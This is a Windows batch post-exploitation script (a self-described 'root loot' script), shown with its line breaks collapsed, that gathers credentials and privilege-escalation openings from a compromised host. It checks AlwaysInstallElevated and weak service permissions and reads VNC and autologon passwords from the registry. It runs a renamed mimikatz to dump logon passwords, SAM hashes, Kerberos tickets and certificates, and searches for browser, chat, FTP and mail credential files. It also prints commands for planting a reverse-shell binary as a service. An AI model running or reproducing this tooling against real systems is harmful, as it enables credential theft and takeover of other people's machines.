@echo OFFcall:creditscall:CheckOSbitratecall:CheckOSversioncall:checkprerequisitefilescall:checkquickwinscall:getfirewallinformationcall:getcomputerinformationcall:dumphashespasseskerberoscertscall:findinterestingfilescall:findinterestingregistrykeyscall:findpasswordscall:checkweakpermissionscall:cleanupgoto end:creditsecho.----------------------------------------------------echo.Author: Jollyfrogs, Brisbane QLDecho.A root loot script I used to learn batch techniquesP, needs TLCecho.----------------------------------------------------echo.goto:eof:CheckOSbitrateIF DEFINED ProgramFiles(x86) (set OSbit=64) else (set OSbit=32)goto:eof:checkprerequisitefilesREM SOME OF THESE COMMANDS MIGHT GENERATE ERRORS SO WE CATCH THEM ALL HEREecho ====================================================================echo ====================== IGNORE THESE ERRORS =========================dir jollykatz%OSbit%.exe /a/s/b 1> nul 2> NULIF %ERRORLEVEL% == 0 set jollykatz=1for /f "tokens=1 delims=" %%a in ('whoami') do set whoami=%%afor /f "tokens=1 delims=" %%a in ('netsh /? ^| findstr \.*.irewal.*.*') do set netshfirewall=%%aREMREM check registry for the following registry entries:REMreg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated | Find "0x1" 1> NULIF %ERRORLEVEL% == 0 ( reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated | Find "0x1" 1> NUL IF %ERRORLEVEL% == 0 (set alwaysinstallelevated=1))reg query "HKCU\SOFTWARE\Microsoft\Protected Storage System Provider" /v "Protected Storage" 1>NULIF %ERRORLEVEL% == 0 (set IE6found=1)reg query "HKCU\SOFTWARE\Microsoft\Internet Explorer\IntelliForms\Storage2" 1>NULIF %ERRORLEVEL% == 0 (set IE7found=1)reg query "HKCU\SOFTWARE\America Online\AIM6\Passwords" 1>NULIF %ERRORLEVEL% == 0 (set AIM6found=1)reg query "HKCU\SOFTWARE\AIM\AIMPRO" 1>NULIF %ERRORLEVEL% == 0 (set AIMPROfound=1)reg query "HKCU\SOFTWARE\Beyluxe Messenger" 1>NULIF %ERRORLEVEL% == 0 (set BEYLUXEfound=1)reg query "HKCU\SOFTWARE\BigAntSoft\BigAntMessenger\Setting" 1>NULIF %ERRORLEVEL% == 0 (set BIGANTfound=1)reg query "HKCU\SOFTWARE\Camfrog\Client" 1>NULIF %ERRORLEVEL% == 0 (set CAMFROGfound=1)reg query "HKCU\SOFTWARE\Google\Google Talk\Accounts" 1>NULIF %ERRORLEVEL% == 0 (set GOOGLETALKfound=1)reg query "HKCU\SOFTWARE\IMVU" 1>NULIF %ERRORLEVEL% == 0 (set IMVUfound=1)reg query "HKCU\SOFTWARE\Nimbuzz\PCClient\Application" 1>NULIF %ERRORLEVEL% == 0 (set NIMBUZZfound=1)reg query "HKCU\SOFTWARE\Paltalk" 1>NULIF %ERRORLEVEL% == 0 (set PALTALKfound=1)reg query "HKCU\SOFTWARE\Yahoo\Pager" 1>NULIF %ERRORLEVEL% == 0 (set YAHOOPAGERfound=1)reg query "HKCU\SOFTWARE\IncrediMail" 1>NULIF %ERRORLEVEL% == 0 (set INCREDIMAILfound=1)reg query "HKCU\SOFTWARE\Microsoft\Office\15.0\Outlook\Profiles\Outlook" 1>NULIF %ERRORLEVEL% == 0 (set OUTLOOK2013found=1)reg query "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows Messenging Subsystem\Profiles" 1>NULIF %ERRORLEVEL% == 0 (set OUTLOOK2010POSTNTfound=1)reg query "HKCU\SOFTWARE\Microsoft\Windows Messenging Subsystem\Profiles" 1>NULIF %ERRORLEVEL% == 0 (set OUTLOOK2010PRENTfound=1)reg query "HKCU\SOFTWARE\Microsoft\Office\Outlookt\OMI Account Manager\Accounts" 1>NULIF %ERRORLEVEL% == 0 (set OUTLOOK98MAILONLYfound=1)reg query "HKCU\SOFTWARE\Microsoft\Internet Account Manager\Accounts" 1>NULIF %ERRORLEVEL% == 0 (set OUTLOOK98NORMALfound=1)reg query "HKCU\SOFTWARE\Adobe\Common\10\Sites" 1>NULIF %ERRORLEVEL% == 0 (set DREAMWEAVERfound=1)reg query "HKCU\SOFTWARE\Google\Google Desktop\Mailboxes\Gmail" 1>NULIF %ERRORLEVEL% == 0 (set GMAILDESKTOPfound=1)reg query "HKCU\SOFTWARE\DownloadManager\Passwords" 1>NULIF %ERRORLEVEL% == 0 (set IDMfound=1)reg query "HKCU\SOFTWARE\Google\Picasa" 1>NULIF %ERRORLEVEL% == 0 (set PICASAfound=1)reg query HKLM\SOFTWARE\RealVNC\vncserver /v Password | Find "Password" 1> NULIF %ERRORLEVEL% == 0 (set realvncpassfound=1)reg query HKLM\Software\TightVNC\Server /v Password | Find "Password" 1> NULIF %ERRORLEVEL% == 0 (set tightvncpassfound1=1)reg query HKLM\Software\TightVNC\Server /v PasswordViewOnly | Find "PasswordViewOnly" 1> NULIF %ERRORLEVEL% == 0 (set tightvncpassfound2=1)reg query HKLM\Software\TigerVNC\WinVNC4 /v Password | Find "Password" 1> NULIF %ERRORLEVEL% == 0 (set tigervncpassfound=1)reg query HKLM\SOFTWARE\ORL\WinVNC3\Default /v Password | Find "Password" 1> NULIF %ERRORLEVEL% == 0 (set vnc3passfound1=1)reg query HKLM\SOFTWARE\ORL\WinVNC3 /v Password | Find "Password" 1> NULIF %ERRORLEVEL% == 0 (set vnc3passfound2=1)reg query HKCU\Software\ORL\WinVNC3 /v Password | Find "Password" 1> NULIF %ERRORLEVEL% == 0 (set vnc3passfound3=1)reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultPassword | Find "DefaultPassword" 1> NULIF %ERRORLEVEL% == 0 ( For /F "Tokens=2*" %%a In ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultPassword') Do set defaultloginpass=%%b  REM we check if the registry key is not null IF NOT [%defaultloginpass%] == [] set winautologinpassfound=1 set defaultloginpass=)reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultUsername | Find "DefaultUsername" 1> NULIF %ERRORLEVEL% == 0 (set winautologinuserfound=1)reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultDomainname | Find "DefaultDomainname" 1> NULIF %ERRORLEVEL% == 0 (set winautologindomainfound=1)REMREMecho ====================== IGNORE THESE ERRORS =========================echo ====================================================================echo.goto:eof:CheckOSVersion@echo offver | find "2003" > nulif %ERRORLEVEL% == 0 goto ver_2003ver | find "XP" > nulif %ERRORLEVEL% == 0 goto ver_xpver | find "2000" > nulif %ERRORLEVEL% == 0 goto ver_2000ver | find "NT" > nulif %ERRORLEVEL% == 0 goto ver_ntif not exist %SystemRoot%\system32\systeminfo.exe goto versioncheckwarnthenexitsysteminfo | find "OS Name" > %TEMP%\osname.txtFOR /F "usebackq delims=: tokens=2" %%i IN (%TEMP%\osname.txt) DO set vers=%%iecho %vers% | find "Windows 7" > nulif %ERRORLEVEL% == 0 goto ver_7echo %vers% | find "Windows Server 2008" > nulif %ERRORLEVEL% == 0 goto ver_2008echo %vers% | find "Windows Vista" > nulif %ERRORLEVEL% == 0 goto ver_vistagoto warnthenexit:ver_7:Run Windows 7 specific commands here.set OSVersion=WIN7goto versioncheckexit:ver_2008:Run Windows Server 2008 specific commands here.set OSVersion=WIN2008goto versioncheckexit:ver_vista:Run Windows Vista specific commands here.set OSVersion=WINVISTAgoto versioncheckexit:ver_2003:Run Windows Server 2003 specific commands here.set OSVersion=WIN2003goto versioncheckexit:ver_xp:Run Windows XP specific commands here.set OSVersion=WINXPgoto versioncheckexit:ver_2000:Run Windows 2000 specific commands here.set OSVersion=WIN2000goto versioncheckexit:ver_nt:Run Windows NT specific commands here.set OSVersion=WINNTgoto versioncheckexit:versioncheckwarnthenexitset OSVersion=UNDETERMINEDgoto:versioncheckexit:versioncheckexitgoto:eof:checkquickwins systeminfo > systeminfo.txt REM === Generic tests across all Windows versions here IF DEFINED alwaysinstallelevated (  echo **** !!! VULNERABLE TO ALWAYSINSTALLELEVATED !!! ****  set alwaysinstallelevated=  echo. ) IF DEFINED realvncpassfound (  echo **** !!! REALVNC PASS FOUND !!! ****  reg query HKLM\SOFTWARE\RealVNC\vncserver /v Password | Find "Password"  echo ************************************  set realvncpassfound=  echo. ) IF DEFINED tightvncpassfound1 (  echo **** !!! TIGHTVNC PASS FOUND !!! ****  reg query HKLM\Software\TightVNC\Server /v Password | Find "Password"  echo *************************************  set tightvncpassfound1=  echo. ) IF DEFINED tightvncpassfound2 (  echo **** !!! TIGHTVNC VIEWONLY PASS FOUND !!! ****  reg query HKLM\Software\TightVNC\Server /v PasswordViewOnly | Find "PasswordViewOnly"  echo **********************************************  set tightvncpassfound2=  echo. ) IF DEFINED tigervncpassfound (  echo **** !!! TIGERVNC PASS FOUND !!! ****  reg query HKLM\Software\TigerVNC\WinVNC4 /v Password | Find "Password"  echo *************************************  set tigervncpassfound=  echo. ) IF DEFINED vnc3passfound1 (  echo **** !!! VNC3 PASS FOUND !!! ****  reg query HKLM\SOFTWARE\ORL\WinVNC3\Default /v Password | Find "Password"  echo *********************************  set vnc3passfound1=  echo. ) IF DEFINED vnc3passfound2 (  echo **** !!! VNC3 PASS FOUND !!! ****  reg query HKLM\SOFTWARE\ORL\WinVNC3 /v Password | Find "Password"  echo *********************************  set vnc3passfound2=  echo. ) IF DEFINED vnc3passfound3 (  echo **** !!! VNC3 PASS FOUND !!! ****  reg query HKCU\Software\ORL\WinVNC3 /v Password | Find "Password"  echo *********************************  set vnc3passfound3=  echo. ) IF DEFINED winautologinpassfound (  echo **** !!! WINDOWS AUTOLOGIN PASS FOUND !!! ****  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultPassword | Find "DefaultPassword"  echo **********************************************  IF DEFINED Winautologinuserfound (   reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultUsername | Find "DefaultUsername"   set winautologinuserfound=  )  IF DEFINED winautologindomainfound (   reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultDomainname | Find "DefaultDomainname"   set winautologindomainfound=  )  set winautologinpassfound= )goto:eof if %OSVersion%==WINXP (  REM Maybe we can do something nice with this, haven't found a really good use yet other than it does work, too many KB's and interdependencies on KB patches  REM for /f "tokens=1 delims=" %%a in ('type systeminfo.txt ^| findstr /C:"KB147222"') do set MYKB=%%a  REM if NOT DEFINED MYKB echo == VULNERABLE TO KBasfjsdfj  REM set MYKB=  REM echo. )goto:eof:getfirewallinformationecho.IF DEFINED netshfirewall (  echo.  echo.Firewall Status  echo.---------------  netsh firewall show state  echo.  echo.  echo.Firewall configuration details  echo.------------------------------  echo.  netsh firewall show config  echo. ) ELSE (  echo === NOTE: The netsh firewall command was not found, skipping checks === )echo.goto:eof:getcomputerinformationecho.echo.This computer is running %OSbit%-bit Windowsecho.IF DEFINED whoami ( echo. echo.Are we running an elevated command prompt? echo.------------------------------------------ for /f "tokens=1 delims=" %%a in ('whoami /groups ^| findstr \.*High.Man') do set runningelevatedprompt=%%a  IF DEFINED runningelevatedprompt (    echo YES, we ARE!   ) ELSE (    echo Sadly, no...   )  echo.  echo.User Groups  echo.-----------  whoami /groups  echo. ) ELSE (  echo === NOTE: The whoami command was not found, skipping checks === )echo.echo.User Accountsecho.-------------net usersecho.echo.Systeminfoecho.----------systeminfoecho.echo.Netstat -anoecho.------------netstat -anoecho.echo.Scheduled tasksecho.---------------schtasks /query /fo LIST /vecho.echo.Task to service mappingecho.-----------------------tasklist /SVCecho.echo.Network settingsecho.----------------ipconfig /allecho.echo.Running windows servicesecho.------------------------net startecho.echo.Listing Windows driversecho.-----------------------DRIVERQUERYecho.echo.Dumping Windows registry to registrydump.txtecho.--------------------------------------------reg query HKLM /s > registrydump.txtreg query HKCU /s >> registrydump.txtecho.echo.Environment variablesecho.---------------------setecho.echo.Group Policyecho.------------gpresult /R 1>2>NULIF %ERRORLEVEL% == 1 ( REM WINXP gpresult) ELSE ( REM WIN7 gpresult /R)echo.REM ** ALEX TO ADD CREDENUMERATE **goto:eof:dumphashespasseskerberoscertsecho.Hashes, passwords, kerberos tickets and certificatesecho.-----------------IF NOT DEFINED jollykatz echo === NOTE: Jollykatz%OSbit%.exe not found, skipping jollykatz checks ===IF NOT DEFINED jollykatz goto:eofecho.echo.sekurlsa::logonPasswords fullecho.------jollykatz%OSbit%.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"echo.echo.lsadump::samecho.------jollykatz%OSbit%.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"echo.echo.sekurlsa::tickets /exportecho.------jollykatz%OSbit%.exe "privilege::debug" "token::elevate" "sekurlsa::tickets /export" "exit"echo.echo.crypto::certificates /export (CERT_SYSTEM_STORE_CURRENT_USER)echo.------jollykatz%OSbit%.exe "privilege::debug" "token::elevate" "crypto::capi" "crypto::cng" "crypto::certificates /systemstore:CERT_SYSTEM_STORE_CURRENT_USER /store:my /export" "exit"echo.echo.crypto::certificates /export (CERT_SYSTEM_STORE_LOCAL_MACHINE)echo.------jollykatz%OSbit%.exe "privilege::debug" "token::elevate" "crypto::capi" "crypto::cng" "crypto::certificates /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE /store:my /export" "exit"echo.echo.crypto::certificates /export (CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE)echo.------jollykatz%OSbit%.exe "privilege::debug" "token::elevate" "crypto::capi" "crypto::cng" "crypto::certificates /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE /store:my /export" "exit"echo.echo.crypto::certificates /export (CERT_SYSTEM_STORE_USERS)echo.------jollykatz%OSbit%.exe "privilege::debug" "token::elevate" "crypto::capi" "crypto::cng" "crypto::certificates /systemstore:CERT_SYSTEM_STORE_USERS /store:my /export" "exit"echo.goto:eof:findinterestingfilesecho.Interesting files and directoriesecho.---------------------------------dir C:\* /a/s/b > dirlisting.txttype dirlisting.txt | findstr /I \.*proof[.]txt$type dirlisting.txt | findstr /I \.*network-secret[.]txt$type dirlisting.txt | findstr /I \.*ssh.*[.]ini$type dirlisting.txt | findstr /I \.*ultravnc[.]ini$type dirlisting.txt | findstr /I \.*vnc[.]ini$type dirlisting.txt | findstr /I \.*bthpan[.]sys$type dirlisting.txt | findstr /I \.*\\repair$type dirlisting.txt | findstr /I \.*passw*. | findstr /VI \.*.chm$ | findstr /VI \.*.log$ | findstr /VI \.*.dll$ | findstr /VI \.*.exe$type dirlisting.txt | findstr /I \.*[.]vnc$type dirlisting.txt | findstr /I \.*groups[.]xml$type dirlisting.txt | findstr /I \.*printers[.]xml$type dirlisting.txt | findstr /I \.*drives[.]xml$type dirlisting.txt | findstr /I \.*scheduledtasks[.]xml$type dirlisting.txt | findstr /I \.*services[.]xml$type dirlisting.txt | findstr /I \.*datasources[.]xml$type dirlisting.txt | findstr /I \.*.rsa.*[.].*$ | findstr /VI \.*.dll$ | findstr /VI \.*.rat$type dirlisting.txt | findstr /I \.*.dsa.*[.].*$ | findstr /VI \.*.dll$ | findstr /VI \.*.exe$ | findstr /VI \.*.gif$ | findstr /VI \.*.handsafe[.]reg$type dirlisting.txt | findstr /I \.*[.]dbx$type dirlisting.txt | findstr /I \.*.account.*.$ | findstr /VI \.*.User.Account.Picture.*. | findstr /VI \.*.bmp$type dirlisting.txt | findstr /I \.*ntds[.].*$type dirlisting.txt | findstr /I \.*hiberfil[.].*$type dirlisting.txt | findstr /I \.*boot[.]ini$type dirlisting.txt | findstr /I \.*win[.]ini$type dirlisting.txt | findstr /I \.*.\\config\\RegBacktype dirlisting.txt | findstr /I \.*.\\CCM\\logstype dirlisting.txt | findstr /I \.*.\\iis.[.]log$type dirlisting.txt | findstr /I \.*.\\Content.IE.\\index.dat$type dirlisting.txt | findstr /I \.*.\\inetpub\\logs\\LogFilestype dirlisting.txt | findstr /I \.*.\\httperr\\httpe.*.[.]log$type dirlisting.txt | findstr /I \.*.\\logfiles\\w3svc1\\ex.*.[.]log$type dirlisting.txt | findstr /I \.*.\\Panther\\ | findstr /VI \.*.Resources\\Themes\\.*.type dirlisting.txt | findstr /I \.*.syspre.*,[.]...$type dirlisting.txt | findstr /I \.*.unatten.*.[.]txt$type dirlisting.txt | findstr /I \.*.unatten.*.[.]xml$type dirlisting.txt | findstr /I \.*Login.Data$type dirlisting.txt | findstr /I \.*Web.Data$type dirlisting.txt | findstr /I \.*Credentials.Store$type dirlisting.txt | findstr /I \.*Credential.Store$type dirlisting.txt | findstr /I \.*Microsoft\\Credentials.*REM Avant Browser:type dirlisting.txt | findstr /I \.*forms[.]dat[.]vdt$type dirlisting.txt | findstr /I \.*default\\formdata\\forms[.]dat$REM Comodo Dragontype dirlisting.txt | findstr /I \.*Dragon\\User.Data\\Default.*REM CoolNovotype dirlisting.txt | findstr /I \.*ChromePlus\\User.Data\\Default.*REM Firefoxtype dirlisting.txt | findstr /I \.*Firefox\\Profiles\\.*[.]default$type dirlisting.txt | findstr /I \.*key3[.]db$REM Flock Browsertype dirlisting.txt | findstr /I \.*Flock\\User.Data\\Default.*REM Google Chrometype dirlisting.txt | findstr /I \.*Chrome\\User.Data\\Default.*type dirlisting.txt | findstr /I \.*Chrome.SXS\\User.Data\\Default.*REM Internet Explorertype dirlisting.txt | findstr /I \.*Microsoft\\Credentials.*REM Maxthontype dirlisting.txt | findstr /I \.*MagicFill.*type dirlisting.txt | findstr /I \.*MagicFill2[.]dat$REM Operatype dirlisting.txt | findstr /I \.*Wand[.]dat$REM Safaritype dirlisting.txt | findstr /I \.*keychain[.]plist$REM SeaMonkeytype dirlisting.txt | findstr /I \.*signons[.]sqlite$REM AIMtype dirlisting.txt | findstr /I \.*aimx[.]bin$REM Digsbytype dirlisting.txt | findstr /I \.*logininfo[.]yaml$type dirlisting.txt | findstr /I \.*digsby[.]dat$REM Meebo Notifiertype dirlisting.txt | findstr /I \.*MeeboAccounts[.]txt$REM Miranda IMtype dirlisting.txt | findstr /I \.*Miranda\\.*[.]dat$REM MySpace IMtype dirlisting.txt | findstr /I \.*MySpace\\IM\\users[.]txt$REM Pidgintype dirlisting.txt | findstr /I \.*Accounts[.]xml$REM Skypetype dirlisting.txt | findstr /I \.*Skype.*config[.]xml$REM Tencent QQtype dirlisting.txt | findstr /I \.*Registry[.]db$REM Trilliantype dirlisting.txt | findstr /I \.*accounts[.]ini$REM XFiretype dirlisting.txt | findstr /I \.*XfireUser[.]ini$REM Foxmailtype dirlisting.txt | findstr /I \.*Account[.]stg$type dirlisting.txt | findstr /I \.*Accounts[.]tdat$REM ThunderBirdtype dirlisting.txt | findstr /I \.*signons[.]sqlite$REM Windows Live Mailtype dirlisting.txt | findstr /I \.*[.]oeaccount$REM FileZillatype dirlisting.txt | findstr /I \.*recentservers[.]xml$REM FlashFXPtype dirlisting.txt | findstr /I \.*Sites[.]dat$REM FTPCommandertype dirlisting.txt | findstr /I \.*Ftplist[.]txt$REM SmartFTPtype dirlisting.txt | findstr /I \.*SmartFTP.*[.]xml$REM WS_FTPtype dirlisting.txt | findstr /I \.*ws_ftp[.]ini$REM Heroes of Newerthtype dirlisting.txt | findstr /I \.*login[.]cfg$REM JDownloadertype dirlisting.txt | findstr /I \.*JDownloader.*type dirlisting.txt | findstr /I \.*database[.]script$type dirlisting.txt | findstr /I \.*accounts[.]ejs$REM OrbitDownloadertype dirlisting.txt | findstr /I \.*sitelogin[.]dat$REM Seesmictype dirlisting.txt | findstr /I \.*data[.]db$REM SuperPuttytype dirlisting.txt | findstr /I \.*sessions[.]xml$REM TweetDecktype dirlisting.txt | findstr /I \.*TweetDeck.*type dirlisting.txt | findstr /I \.*[.]localstorage$echo.goto:eof:findinterestingregistrykeysREM Source: securityxploded dot com slash passwordsecrets dot phpIF EXIST AIM6found (reg query "HKCU\SOFTWARE\America Online\AIM6\Passwords")IF EXIST AIMPROfound (reg query "HKCU\SOFTWARE\AIM\AIMPRO")IF EXIST IE6found (reg query "HKCU\SOFTWARE\Microsoft\Protected Storage System Provider" /v "Protected Storage")IF EXIST IE7found (reg query "HKCU\SOFTWARE\Microsoft\Internet Explorer\IntelliForms\Storage2")IF EXIST BEYLUXEfound (reg query "HKCU\SOFTWARE\Beyluxe Messenger")IF EXIST BIGANTfound (reg query "HKCU\SOFTWARE\BigAntSoft\BigAntMessenger\Setting")IF EXIST CAMFROGfound (reg query "HKCU\SOFTWARE\Camfrog\Client")IF EXIST GOOGLETALKfound (reg query "HKCU\SOFTWARE\Google\Google Talk\Accounts")IF EXIST IMVUfound (reg query "HKCU\SOFTWARE\IMVU")IF EXIST NIMBUZZfound (reg query "HKCU\SOFTWARE\Nimbuzz\PCClient\Application")IF EXIST PALTALKfound (reg query "HKCU\SOFTWARE\Paltalk")IF EXIST YAHOOPAGERfound (reg query "HKCU\SOFTWARE\Yahoo\Pager")IF EXIST INCREDIMAIL (reg query "HKCU\SOFTWARE\IncrediMail")IF EXIST OUTLOOK2013found (reg query "HKCU\SOFTWARE\Microsoft\Office\15.0\Outlook\Profiles\Outlook")IF EXIST OUTLOOK2010POSTNTfound (reg query "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows Messenging Subsystem\Profiles")IF EXIST OUTLOOK2010PRENTfound (reg query "HKCU\SOFTWARE\Microsoft\Windows Messenging Subsystem\Profiles")IF EXIST OUTLOOK98MAILONLYfound (reg query "HKCU\SOFTWARE\Microsoft\Office\Outlookt\OMI Account Manager\Accounts")IF EXIST OUTLOOK98NORMALfound (reg query "HKCU\SOFTWARE\Microsoft\Internet Account Manager\Accounts")IF EXIST DREAMWEAVERfound (reg query "HKCU\SOFTWARE\Adobe\Common\10\Sites")IF EXIST GMAILDESKTOPfound (reg query "HKCU\SOFTWARE\Google\Google Desktop\Mailboxes\Gmail")IF EXIST IDMfound (reg query "HKCU\SOFTWARE\DownloadManager\Passwords")IF EXIST PICASAfound (reg query "HKCU\SOFTWARE\Google\Picasa")REM:findpasswordsecho.Searching for passwords (this can take a while)echo.-----------------------------------------------findstr /si pwd= *.xml *.ini *.txtfindstr /si password= *.xml *.ini *.txtfindstr /si pass= *.xml *.ini *.txtgoto:eof:checkweakpermissionsecho.Searching for weak service permissions (this can take a while)echo.--------------------------------------------------------------if exist serviceexes.txt del serviceexes.txtif exist dirlisting.txt del dirlisting.txtdir \ /a/s/b > dirlisting.txtfor /f "tokens=1 delims=," %%a in ('tasklist /SVC /FO CSV ^| findstr /I \.*exe*. ^| findstr /VI "smss.exe csrss.exe winlogon.exe services.exe spoolsv.exe explorer.exe ctfmon.exe wmiprvse.exe msmsgs.exe notepad.exe lsass.exe svchost.exe findstr.exe cmd.exe tasklist.exe"') do (findstr %%a$ | findstr /VI "\.*winsxs\\*.") <dirlisting.txt >> serviceexes.txtREM In the line below we parse serviceexes.txt and check each line for write access. We check write access by appending (writing) nothing to the file, we then use batch logic to test results and output results in echoREM for /f "tokens=*" %%a in (serviceexes.txt) do 2>nul (>>%%a echo off) && (echo === !!! RW access to service executable: %%a !!! ===) || (call)REM Ninja magic to find out if we have write access, only partially reliable so decided to go with cacls insteadREM @echo off & 2>nul (>>"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" echo off) && (echo RW access) || (echo no RW access) & echo onfor /f "tokens=*" %%a in (serviceexes.txt) do (cacls "%%a"|findstr /I "Users:"|findstr /I "W F") && (echo === !!! Write access to service executable: %%a !!! ===) || (call)for /f "tokens=*" %%a in (serviceexes.txt) do (cacls "%%a"|findstr /I "Everyone"|findstr /I "W F") && (echo === !!! Write access to service executable: %%a !!! ===) || (call)echo.Files and folder with Read-Write accessecho.---------------------------------------dir accesschk.exe /a/s/b 1>2>NULIF %ERRORLEVEL% == 0 ( echo === NOTE: accesschk.exe not found, skipping accesschk file permissions checks === goto:eof) accesschk.exe /accepteula 1>2>NUL  accesschk.exe -uwqs "Everyone" c:\*.* | findstr /VI "\.*system32\\Setup*. \.*system32\\spool\\PRINTERS*. \.*Registration\\CRMLog*. \.*Debug\\UserMode*. \.*WINDOWS\\Tasks*. \.*WINDOWS\\Temp*. \.*Documents.And.Settings*. \.*RECYCLER*. \.*System.Volume.Information*." accesschk.exe -uwqs "Users" c:\*.* | findstr /VI "\.*system32\\Setup*. \.*system32\\spool\\PRINTERS*. \.*Registration\\CRMLog*. \.*Debug\\UserMode*. \.*WINDOWS\\Tasks*. \.*WINDOWS\\Temp*. \.*Documents.And.Settings*. \.*RECYCLER*. \.*System.Volume.Information*." accesschk.exe -uwqs "Authenticated Users" c:\*.*  | findstr /VI \.*System.Volume.Information*. | findstr /VI \.*Documents.And.Settings*.  echo.Searching for weak service permissions echo.-------------------------------------- accesschk.exe -uwcqv "Authenticated Users" * | Find "RW " 1> NUL if %ERRORLEVEL% == 0 (  echo.**** !!! VULNERABLE SERVICES FOUND - Authenticated Users!!! ****  accesschk.exe -uwcqv "Authenticated Users" *  echo.****************************************************************  echo. ) accesschk.exe /accepteula 1>2>NUL accesschk.exe -uwcqv "Users" * | Find "RW " 1> NUL if %ERRORLEVEL% == 0 (  echo.**** !!! VULNERABLE SERVICES FOUND - All Users !!! ****  accesschk.exe -uwcqv "Users" *  echo.*******************************************************  echo.To plant binary in service use:  echo.sc config [service_name] binpath= "C:\rshell.exe"  echo.sc config [service_name] obj= ".\LocalSystem" password= ""  echo.sc qc [service_name] (to verify!)  echo.net start [service_name]  echo.******************************************************* ) accesschk.exe /accepteula 1>2>NUL accesschk.exe -uwcqv "Everyone" * | Find "RW " 1> NUL if %ERRORLEVEL% == 0 (  echo.**** !!! VULNERABLE SERVICES FOUND - Everyone !!! ****  accesschk.exe -uwcqv "Everyone" *  echo.*******************************************************  echo.To plant binary in service use:  echo.sc config [service_name] binpath= "C:\rshell.exe"  echo.sc config [service_name] obj= ".\LocalSystem" password= ""  echo.sc qc [service_name] (to verify!)  echo.net start [service_name]  echo.*******************************************************goto:eof:cleanupset jollykatz=set accesschk=set OSbit=set whoami=set runningelevatedprompt=set netshfirewall=set OSVersion=set alwaysinstallelevated=set realvncpassfound=set tightvncpassfound1=set tightvncpassfound2=set tigervncpassfound=set vnc3passfound1=set vnc3passfound2=set vnc3passfound3=set winautologinpassfound=set winautologindomainfound=set winautologinuserfound=set defaultloginpass=set IE6found=set IE7found=set AIM6found=set AIMPROfound=set BEYLUXEfound=set BIGANTfound=set CAMFROGfound=set GOOGLETALKfound=set IMVUfound=set NIMBUZZfound=set PALTALKfound=set YAHOOPAGERfound=set INCREDIMAILfound=set OUTLOOK2013found=set OUTLOOK2010POSTNTfound=set OUTLOOK2010PRENTfound=set OUTLOOK98MAILONLYfound=set OUTLOOK98NORMALfound=goto:eof:endecho.echo.==============echo.Dump complete!echo.==============GOTO:eof